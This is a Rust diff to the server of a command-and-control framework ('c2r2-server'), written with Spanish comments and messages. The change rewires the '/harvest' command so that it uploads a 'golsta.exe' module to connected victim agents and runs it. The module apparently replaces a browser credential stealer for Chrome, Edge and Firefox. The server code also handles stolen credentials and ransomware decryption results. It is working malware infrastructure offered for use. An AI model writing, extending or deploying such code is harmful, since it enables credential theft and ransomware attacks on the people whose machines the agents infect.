@@ -24,7 +24,9 @@ use tracing_subscriber::EnvFilter;
 
 // API module for team client communication
 mod api;
-use api::{create_api_router, AgentInfo as ApiAgentInfo, ApiState, DirEntry as ApiDirEntry};
+use api::{
+    create_api_router, AgentInfo as ApiAgentInfo, ApiState, DirEntry as ApiDirEntry, GolstaClient,
+};
 
 type ClientId = u64;
 
@@ -32,6 +34,7 @@ const DELIMITER: &str = "\n<<END>>\n";
 const CERTS_DIR: &str = "certs";
 const CERT_FILE: &str = "server.crt";
 const KEY_FILE: &str = "server.key";
+const GOLSTA_MODULE_NAME: &str = "golsta.exe";
 
 #[derive(Parser)]
 #[command(name = "c2r2-server")]
@@ -52,6 +55,10 @@ struct Args {
     /// Contraseña para la API de Team Client
     #[arg(long = "api-password", default_value = "c2r2-secret")]
     api_password: String,
+
+    /// URL del backend privado de Golsta (token en GOLSTA_INTEGRATION_TOKEN)
+    #[arg(long = "golsta-url", default_value = "http://127.0.0.1:18080")]
+    golsta_url: String,
 
     /// Modo verboso
     #[arg(short, long)]
@@ -362,13 +369,13 @@ async fn handle_client(
                     let message = format!("{}\n", cmd);
                     if let Err(e) = writer.write_all(message.as_bytes()).await {
                         if verbose {
-                            eprintln!("{} Error enviando a [{}]: {}", "".bright_red(), id, e);
+                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
                         }
                         break;
                     }
                     if let Err(e) = writer.flush().await {
                         if verbose {
-                            eprintln!("{} Error flush [{}]: {}", "".bright_red(), id, e);
+                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
                         }
                         break;
                     }
@@ -717,7 +724,7 @@ async fn handle_client(
                 }
                 Err(e) => {
                     if verbose {
-                        eprintln!("{} Error leyendo [{}]: {}", " ".bright_yellow(), id, e);
+                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
                     }
                     return;
                 }
@@ -735,7 +742,7 @@ async fn handle_client(
     clients.lock().unwrap().remove(&id);
     api_state.remove_agent(id).await;
     warn!("Cliente [{}] desconectado", id);
-    println!(" Cliente [{}] desconectado", id);
+    println!("❌ Cliente [{}] desconectado", id);
 }
 
 fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
@@ -744,7 +751,7 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
 
     if parts.len() != 4 {
         error!("[{}] Formato de archivo inválido en descarga", client_id);
-        eprintln!("{} Formato de archivo inválido", "".bright_red());
+        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
         return;
     }
 
@@ -827,7 +834,7 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
         }
         Err(e) => {
             error!("[{}] Error decodificando base64: {}", client_id, e);
-            eprintln!("{} Error decodificando base64: {}", "".bright_red(), e);
+            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
         }
     }
 }
@@ -909,7 +916,7 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
                         }
                         Err(e) => {
                             error!("[{}] Error guardando credenciales: {}", client_id, e);
-                            eprintln!("{} Error guardando credenciales: {}", "".bright_red(), e);
+                            eprintln!("{} Error guardando credenciales: {}", "❌".bright_red(), e);
                         }
                     }
                 }
@@ -928,7 +935,7 @@ fn handle_credentials_harvest(encoded_data: &str, client_id: ClientId) {
         }
         Err(e) => {
             error!("[{}] Error decodificando Base64: {}", client_id, e);
-            eprintln!("{} Error decodificando Base64: {}", "".bright_red(), e);
+            eprintln!("{} Error decodificando Base64: {}", "❌".bright_red(), e);
         }
     }
 }
@@ -1007,7 +1014,7 @@ fn handle_ransomware_response(result: &str, client_id: ClientId) {
     } else if result.starts_with("OK:") {
         // Resultado de desencriptación
         let msg = result.strip_prefix("OK:").unwrap_or(result);
-        println!("  {} {}", "".bright_green(), msg.bright_white());
+        println!("  {} {}", "✅".bright_green(), msg.bright_white());
     } else {
         // Otro resultado
         println!("  {}", result.bright_white());
@@ -1085,6 +1092,34 @@ fn base64_encode(data: &[u8]) -> String {
     }
 
     result
+}
+
+fn golsta_harvest_commands_from(module: &[u8]) -> Result<[String; 2], String> {
+    if !module.starts_with(b"MZ") {
+        return Err("golsta.exe no es un ejecutable PE válido".to_string());
+    }
+
+    Ok([
+        format!(
+            "__UPLOAD__|{}|{}",
+            GOLSTA_MODULE_NAME,
+            base64_encode(module)
+        ),
+        "__HARVEST__".to_string(),
+    ])
+}
+
+pub(crate) fn golsta_harvest_commands() -> Result<[String; 2], String> {
+    let module_path = get_modules_path().join(GOLSTA_MODULE_NAME);
+    let module = fs::read(&module_path).map_err(|e| {
+        format!(
+            "No se pudo leer el módulo Golsta en '{}': {}",
+            module_path.display(),
+            e
+        )
+    })?;
+
+    golsta_harvest_commands_from(&module)
 }
 
 #[tokio::main]
@@ -1217,7 +1252,7 @@ async fn main() {
         format!("{}/", CERTS_DIR).bright_white()
     );
     if args.verbose {
-        println!("{}", " Verbose Mode: ON".bright_magenta());
+        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
     }
     println!();
 
@@ -1230,7 +1265,21 @@ async fn main() {
     let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));
 
     // Create API state for team client communication
-    let api_state = Arc::new(ApiState::new(args.api_password.clone(), args.verbose));
+    let golsta = env::var("GOLSTA_INTEGRATION_TOKEN")
+        .ok()
+        .filter(|token| !token.trim().is_empty())
+        .and_then(|token| match GolstaClient::new(&args.golsta_url, token) {
+            Ok(client) => Some(client),
+            Err(error) => {
+                warn!("Integración Golsta deshabilitada: {}", error);
+                None
+            }
+        });
+    let api_state = Arc::new(ApiState::new(
+        args.api_password.clone(),
+        args.verbose,
+        golsta,
+    ));
 
     // Start HTTP API server for team clients
     let api_state_http = api_state.clone();
@@ -1284,7 +1333,7 @@ async fn main() {
                     });
                 }
                 Err(e) => {
-                    eprintln!("{} {}", " Error:".bright_red().bold(), e);
+                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
                 }
             }
         }
@@ -1385,7 +1434,7 @@ async fn main() {
                             "  {} {:<20} {}",
                             "🔑".bright_red(),
                             "/harvest",
-                            "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)"
+                            "Sube y ejecuta Golsta; resultados en /api/golsta/harvests"
                                 .bright_white()
                         );
                         println!(
@@ -1756,60 +1805,17 @@ async fn main() {
                             let clients = clients.lock().unwrap();
 
                             if let Some(client) = clients.get(&id) {
-                                info!(
-                                    "[{}] Comando /harvest: Robando credenciales de browsers",
-                                    id
-                                );
+                                info!("[{}] Comando /harvest: ejecutando Golsta", id);
 
-                                // Verificar que existan los archivos del módulo
-                                let modules_dir = get_modules_path();
-                                let stealer_enc_path = modules_dir.join("stealer.enc");
-                                let stealer_key_path = modules_dir.join("stealer.key");
-
-                                if !stealer_enc_path.exists() {
-                                    println!(
-                                        "{}",
-                                        "❌ Error: stealer.enc no encontrado".bright_red()
-                                    );
-                                    println!("   Ruta buscada: {}", stealer_enc_path.display());
-                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
-                                    continue;
-                                }
-
-                                if !stealer_key_path.exists() {
-                                    println!(
-                                        "{}",
-                                        "❌ Error: stealer.key no encontrado".bright_red()
-                                    );
-                                    println!("   Ruta buscada: {}", stealer_key_path.display());
-                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
-                                    continue;
-                                }
-
-                                // Leer archivos
-                                let dll_data = match fs::read(stealer_enc_path) {
-                                    Ok(data) => data,
-                                    Err(e) => {
-                                        println!(
-                                            "{} Error leyendo stealer.enc: {}",
-                                            "❌".bright_red(),
-                                            e
-                                        );
-                                        continue;
-                                    }
-                                };
-
-                                let key_data = match fs::read(stealer_key_path) {
-                                    Ok(data) => data,
-                                    Err(e) => {
-                                        println!(
-                                            "{} Error leyendo stealer.key: {}",
-                                            "❌".bright_red(),
-                                            e
-                                        );
-                                        continue;
-                                    }
-                                };
+                                let [upload_command, harvest_command] =
+                                    match golsta_harvest_commands() {
+                                        Ok(commands) => commands,
+                                        Err(e) => {
+                                            error!("[{}] Error preparando Golsta: {}", id, e);
+                                            println!("{} {}", "❌ Error:".bright_red().bold(), e);
+                                            continue;
+                                        }
+                                    };
 
                                 println!();
                                 println!(
@@ -1819,7 +1825,7 @@ async fn main() {
                                 );
                                 println!(
                                     "{}",
-                                    format!("║           🔑 HARVESTING CREDENTIALS [{}]", id)
+                                    format!("║                🔑 GOLSTA HARVEST [{}]", id)
                                         .bright_red()
                                         .bold()
                                 );
@@ -1829,51 +1835,24 @@ async fn main() {
                                         .bright_red()
                                 );
                                 println!();
-                                println!("{}", "  📤 Subiendo stealer.enc...".bright_yellow());
+                                println!("{}", "  📤 Subiendo golsta.exe...".bright_yellow());
 
-                                // Subir DLL encriptada
-                                let encoded_dll = base64_encode(&dll_data);
-                                let upload_dll_cmd =
-                                    format!("__UPLOAD__|stealer.enc|{}", encoded_dll);
-                                if let Err(e) = client.tx.send(upload_dll_cmd) {
-                                    error!("[{}] Error enviando stealer.enc: {}", id, e);
+                                if let Err(e) = client.tx.send(upload_command) {
+                                    error!("[{}] Error enviando golsta.exe: {}", id, e);
                                     println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                     continue;
                                 }
 
-                                // Esperar un poco para que se suba
-                                std::thread::sleep(std::time::Duration::from_millis(200));
-
-                                println!("{}", "  � Subiendo stealer.key...".bright_yellow());
-
-                                // Subir clave
-                                let encoded_key = base64_encode(&key_data);
-                                let upload_key_cmd =
-                                    format!("__UPLOAD__|stealer.key|{}", encoded_key);
-                                if let Err(e) = client.tx.send(upload_key_cmd) {
-                                    error!("[{}] Error enviando stealer.key: {}", id, e);
-                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
-                                    continue;
-                                }
-
-                                // Esperar un poco
-                                std::thread::sleep(std::time::Duration::from_millis(200));
-
-                                println!("{}", "  🚀 Ejecutando stealer...".bright_yellow());
+                                println!("{}", "  🚀 Ejecutando Golsta...".bright_yellow());
                                 println!(
                                     "{}",
-                                    "  🎯 Chrome, Edge, Firefox, Brave, Opera"
+                                    "  📡 Resultados disponibles en /api/golsta/harvests"
                                         .bright_white()
                                         .dimmed()
                                 );
-                                println!(
-                                    "{}",
-                                    "  ⏳ Esperando credenciales...".bright_white().dimmed()
-                                );
                                 println!();
 
-                                // Enviar comando de harvest
-                                if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
+                                if let Err(e) = client.tx.send(harvest_command) {
                                     error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
                                     println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                 }
@@ -2523,7 +2502,7 @@ async fn main() {
                 std::process::exit(0);
             }
             Err(err) => {
-                eprintln!("{} Error: {:?}", "".bright_red(), err);
+                eprintln!("{} Error: {:?}", "❌".bright_red(), err);
                 break;
             }
         }
@@ -2531,4 +2510,18 @@ async fn main() {
 
     // Mantener guard vivo hasta el final (necesario para flush de logs)
     drop(guard);
+}
+
+#[cfg(test)]
+mod tests {
+    use super::golsta_harvest_commands_from;
+
+    #[test]
+    fn golsta_harvest_builds_ordered_upload_and_execute_commands() {
+        let commands = golsta_harvest_commands_from(b"MZ").unwrap();
+
+        assert_eq!(commands[0], "__UPLOAD__|golsta.exe|TVo=");
+        assert_eq!(commands[1], "__HARVEST__");
+        assert!(golsta_harvest_commands_from(b"not-a-pe").is_err());
+    }
 }
